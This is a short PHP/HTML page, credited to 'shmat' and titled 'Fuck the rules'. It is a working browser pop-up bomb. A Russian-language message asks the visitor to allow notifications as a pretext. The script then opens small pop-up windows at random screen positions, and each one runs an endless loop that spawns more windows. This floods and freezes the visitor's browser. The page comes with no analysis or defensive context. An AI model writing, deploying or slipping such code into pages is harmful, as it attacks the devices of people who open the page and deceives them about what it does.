<!--
By shmat
-->
<html>
    <head>
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>
            Fuck the rules
        </title>
    </head>
    <body>
<?php
  if(@$_GET['i']){
?>
<script>
  var i = 0;
  while (true) {
    function randomInteger(min, max) {
      var rand = min + Math.random() * (max + 1 - min);
      rand = Math.floor(rand);
      return rand;
    }
    var su = randomInteger(1, 1500);
    var us = randomInteger(1, 1000);
    window.open(document.location.protocol+'://'+location.hostname+'/?i=1', '1'+i ,'top='+ us +', left='+ su +', menubar=0, toolbar=0, location=0, directories=0, status=0, scrollbars=0, resizable=0, width=50, height=50');
    i++;
  }
</script>
<?php
  }else{
?>
<center><h3>Разрешите показ уведомлений для дальнейшей работы</h3></center>
<script>
var i = 0;
while (i < 2) {
  function randomInteger(min, max) {
    var rand = min + Math.random() * (max + 1 - min);
    rand = Math.floor(rand);
    return rand;
  }
  var su = randomInteger(1, 1000);
  var us = randomInteger(1, 1000);
  window.open(document.location.protocol+'://'+location.hostname+'/?i=1', '1'+i ,'top='+ us +', left='+ su +', menubar=0, toolbar=0, location=0, directories=0, status=0, scrollbars=0, resizable=0, width=50, height=50');
  i++;
}
</script>
<?php
}
?>
    </body>
</html>
